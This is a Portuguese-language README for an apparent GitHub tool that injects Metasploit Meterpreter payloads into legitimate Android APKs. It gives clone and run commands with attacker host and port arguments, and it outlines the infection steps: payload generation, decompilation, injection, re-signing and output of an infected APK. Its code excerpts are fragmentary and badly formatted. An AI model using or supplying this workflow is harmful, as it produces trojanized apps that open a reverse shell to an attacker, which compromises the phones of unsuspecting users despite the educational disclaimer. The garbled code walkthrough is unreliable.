# Payload APK 
O Payload APK é uma ferramenta simples para injetar payloads Metasploit em aplicativos Android legítimos. Este script automatiza o processo de criação de um APK infectado para fins de teste e pesquisa.

## Requisitos

Certifique-se de ter as seguintes dependências instaladas no seu sistema:

- [APKTool](https://ibotpeaches.github.io/Apktool/)
- [Jarsigner](https://docs.oracle.com/en/java/javase/11/tools/jarsigner.html) ou [APKSigner](https://github.com/iBotPeaches/Apktool)

## Uso

1. Clone o repositório:

    ```bash
    git clone https://github.com/sucloudflare/payload_apk.git
    ```

2. Navegue até o diretório do script:

    ```bash
    cd payload_apk
    ```

3. Execute o script com os argumentos necessários:

    ```bash
    python payload_apk.py --lhost SEU_ENDERECO_IP --lport SUA_PORTA --normal-apk CAMINHO_APK_LEGITIMO --apk-name NOME_APK
    ```

    Certifique-se de substituir `SEU_ENDERECO_IP`, `SUA_PORTA`, `CAMINHO_APK_LEGITIMO` e `NOME_APK` pelos valores desejados.

4. O arquivo APK infectado será gerado no diretório e estará disponível como `Final_Infected.apk`.

<h1>Explicação</h1>

Esse código é um script Python que automatiza o processo de criação de um APK infectado com um payload Meterpreter para fins educacionais e de pesquisa. Aqui está uma breve explicação de cada parte do código: 

    Importação de Bibliotecas: 

    Pitão 

import os
import subprocess
import argparse
import random
import banner
import shutil

O script faz uso de bibliotecas padrão do Python para realizar várias operações, como manipulação de sistema, subprocessos, análise de argumentos da linha de comando, geração de números aleatórios e manipulação de banners. 

Definição de Cores: 

Pitão 

    BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
    
    
São constantes para melhorar a legibilidade da saída colorida do terminal. 

Obtenção de Argumentos da Linha de Comando:

Pitão 

        def obter_argumentos():
    
    
O script usa a biblioteca  argparse para analisar e obter os argumentos passados pela linha de comando.

Verificação de Dependências: 

Pitão 

        def verificar_dependencias(dependencia, nome):

    
def verificar_dependencias_e_atualizacoes():

    
Essas funções verificam se as dependências necessárias, como  apktool,  jarsigner,  apksigner e  zipalign, estão instaladas no sistema. Se não estiverem, o script oferece a opção de instalá-las. 

Função Principal ( main): 

Pitão 

        def main():
        arguments = obter_argumentos()  
        
            
    A função principal do script onde todo o processo é coordenado. Ele obtém os argumentos da linha de comando, gera variáveis aleatórias, verifica dependências, gera um payload Meterpreter, realiza a descompilação do APK original, faz modificações, compila o APK infectado, assina e ajusta o alinhamento do APK.

O código é bastante extenso, e detalhes específicos de cada função foram omitidos aqui. Se você tiver dúvidas sobre partes específicas ou quiser uma explicação mais detalhada de alguma seção, por favor, sinta-se à vontade para pergunta 


## Contribuindo

Se você encontrar problemas ou tiver sugestões para melhorias, sinta-se à vontade para abrir uma [issue](https://github.com/sucloudflare/payload-apk-generator/issues) ou enviar um [pull request](https://github.com/sucloudflare/payload-apk-generator/pulls).

## Aviso Legal

Este script é destinado apenas para fins educacionais e de pesquisa. O uso indevido deste script em ambientes não autorizados é estritamente proibido.

